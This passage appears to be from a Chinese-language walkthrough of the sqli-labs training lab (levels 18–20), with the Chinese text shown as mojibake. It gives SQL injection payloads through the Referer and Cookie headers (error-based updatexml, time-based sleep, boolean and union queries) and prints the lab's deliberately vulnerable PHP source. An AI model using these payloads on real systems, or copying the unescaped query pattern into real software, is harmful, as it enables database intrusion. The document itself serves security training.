class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">$fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;User Agent:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line">$sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line"><span class="keyword">if</span>($row1)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    $insert=<span class="string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;, <span class="subst">$uname</span>)&quot;</span>;</span><br><span class="line">    mysql_query($insert);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your User Agent is: &#x27;</span> .$uagent;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;   /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-19"><a href="#Less-19" class="headerlink" title="Less-19"></a>Less-19</h2><p>è¿™ä¸ªæ˜¯Referer insertæ³¨å…¥ï¼Œå’Œä¸Šä¸€å…³æ€è·¯ä¸€æ ·</p><p>sqlè¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> <span class="string">`security`</span>.<span class="string">`referers`</span> (<span class="string">`referer`</span>, <span class="string">`ip_address`</span>) <span class="keyword">VALUES</span> (<span class="string">&#x27;$refer&#x27;</span>, <span class="string">&#x27;$IP&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æŠ¥é”™æ³¨å…¥æ„é€ ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 1&#x27; or updatexml(1,concat(0x3a,(select user())),1) or &#x27;</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200513233808.png" style="zoom: 67%;"><p>æ—¶é—´ç›²æ³¨æ„é€ :</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span>: 1&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0) or &#x27;</span><br></pre></td></tr></table></figure><h3 id="å…³é”®ä»£ç -18"><a href="#å…³é”®ä»£ç -18" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// truncation (see comments)</span></span><br><span class="line">$value = substr($value,<span class="number">0</span>,<span class="number">20</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line"><span class="keyword">if</span> (get_magic_quotes_gpc())</span><br><span class="line">    &#123;</span><br><span class="line">    $value = stripslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Quote if not a number</span></span><br><span class="line"><span class="keyword">if</span> (!ctype_digit($value))</span><br><span class="line">    &#123;</span><br><span class="line">    $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    $value = intval($value);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">return</span> $value;</span><br><span class="line">&#125;</span><br><span class="line">$uagent = $_SERVER[<span class="string">&#x27;HTTP_REFERER&#x27;</span>];</span><br><span class="line">$IP = $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;Your IP ADDRESS is: &#x27;</span> .$IP;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">$passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">&#x27;result.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">fwrite($fp,<span class="string">&#x27;Referer:&#x27;</span>.$uname.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line">$sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">$result1 = mysql_query($sql);</span><br><span class="line">$row1 = mysql_fetch_array($result1);</span><br><span class="line"><span class="keyword">if</span>($row1)</span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    $insert=<span class="string">&quot;INSERT INTO `security`.`referers` (`referer`, `ip_address`) VALUES (&#x27;<span class="subst">$uagent</span>&#x27;, &#x27;<span class="subst">$IP</span>&#x27;)&quot;</span>;</span><br><span class="line">    mysql_query($insert);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your Referer is: &#x27;</span> .$uagent;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">    print_r(mysql_error());</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot;  /&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-20"><a href="#Less-20" class="headerlink" title="Less-20"></a>Less-20</h2><p>è¿™ä¸ªå°±æ˜¯Cookieæ³¨å…¥äº†ï¼Œsqlè¯­å¥ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username=<span class="string">&#x27;$cookee&#x27;</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>å…ˆç™»é™†è¿›å»å‘ç°Cookieå­—æ®µå¢åŠ äº†uname,ç›´æ¥è”åˆæŸ¥è¯¢</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=adsadas&#x27; union select 1,2,database()%23</span><br></pre></td></tr></table></figure><img src="/2019/10/17/sqli-labs-wp/TIMæˆªå›¾20200513235346.png" style="zoom:67%;"><p>æŠ¥é”™æ³¨å…¥ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=asddasd&#x27; or updatexml(1,concat(0x3a,(select user())),1)%23</span><br></pre></td></tr></table></figure><p>æ—¶é—´ç›²æ³¨ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=adsadas&#x27; or if(substr((select database()),1,1)=&#x27;s&#x27;,sleep(3),0)%23</span><br></pre></td></tr></table></figure><p>å¸ƒå°”ç›²æ³¨ï¼š</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Cookie</span>: uname=adsadas&#x27; or substr((select database()),1,1)=&#x27;s&#x27;%23</span><br></pre></td></tr></table></figure><h3 id="å…³é”®ä»£ç -19"><a href="#å…³é”®ä»£ç -19" class="headerlink" title="å…³é”®ä»£ç "></a>å…³é”®ä»£ç </h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_COOKIE[<span class="string">&#x27;uname&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;../sql-connections/sql-connect.php&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">check_input</span>(<span class="params">$value</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($value))</span><br><span class="line">            &#123;</span><br><span class="line">                $value = substr($value,<span class="number">0</span>,<span class="number">20</span>); <span class="comment">// truncation (see comments)</span></span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc())  <span class="comment">// Stripslashes if magic quotes enabled</span></span><br><span class="line">            &#123;</span><br><span class="line">                $value = stripslashes($value);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">if</span> (!ctype_digit($value))       <span class="comment">// Quote if not a number</span></span><br><span class="line">            &#123;</span><br><span class="line">                $value = <span class="string">&quot;&#x27;&quot;</span> . mysql_real_escape_string($value) . <span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                $value = intval($value);</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">return</span> $value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;uname&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">&#x27;passwd&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        $uname = check_input($_POST[<span class="string">&#x27;uname&#x27;</span>]);</span><br><span class="line">        $passwd = check_input($_POST[<span class="string">&#x27;passwd&#x27;</span>]);</span><br><span class="line">        $sql=<span class="string">&quot;SELECT  users.username, users.password FROM users WHERE users.username=<span class="subst">$uname</span> and users.password=<span class="subst">$passwd</span> ORDER BY users.id DESC LIMIT 0,1&quot;</span>;</span><br><span class="line">        $result1 = mysql_query($sql);</span><br><span class="line">        $row1 = mysql_fetch_array($result1);</span><br><span class="line">        $cookee = $row1[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="keyword">if</span>($row1)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">                setcookie(<span class="string">&#x27;uname&#x27;</span>, $cookee, time()+<span class="number">3600</span>);</span><br><span class="line">                header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;I LOVE YOU COOKIES&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size = 3 &gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/flag.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="comment">//echo &quot;Try again looser&quot;;</span></span><br><span class="line">                print_r(mysql_error());</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">&#x27;submit&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $cookee = $_COOKIE[<span class="string">&#x27;uname&#x27;</span>];</span><br><span class="line">        $format = <span class="string">&#x27;D d M Y - H:i:s&#x27;</span>;</span><br><span class="line">        $timestamp = time() + <span class="number">3600</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/Less-20.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;font color= &quot;red&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;YOUR USER AGENT IS : &quot;</span>.$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;cyan&quot; font size=&quot;4&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;YOUR IP ADDRESS IS : &quot;</span>.$_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 4 &gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;DELETE YOUR COOKIE OR WAIT FOR IT TO EXPIRE &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;orange&quot; font size = 5 &gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;YOUR COOKIE : uname = <span class="subst">$cookee</span> and expires: &quot;</span> . date($format, $timestamp);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;/font&gt;&quot;</span>;</span><br><span class="line">        $sql=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">        $result=mysql_query($sql);</span><br><span class="line">        <span class="keyword">if</span> (!$result)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());</span><br><span class="line">                &#125;</span><br><span class="line">        $row = mysql_fetch_array($result);</span><br><span class="line">        <span class="keyword">if</span>($row)</span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. $row[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .$row[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .$row[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;br&gt;&lt;br&gt;&lt;br&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;&lt;img src=&quot;../images/slap1.jpg&quot; /&gt;&#x27;</span>;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;br&gt;&lt;b&gt;&quot;</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;center&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;input  type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Delete Your Cookie!&quot; /&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/form&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/center&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;#FFFF00&quot; font size = 6 &gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot; Your Cookie is deleted&quot;</span>;</span><br><span class="line">        setcookie(<span class="string">&#x27;uname&#x27;</span>, $row1[<span class="string">&#x27;username&#x27;</span>], time()<span class="number">-3600</span>);</span><br><span class="line">        header (<span class="string">&#x27;Location: index.php&#x27;</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">fwrite($fp,<span class="string">&#x27;Cookie:&#x27;</span>.$cookee.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Less-21"><a href="#Less-21" class="headerlink" 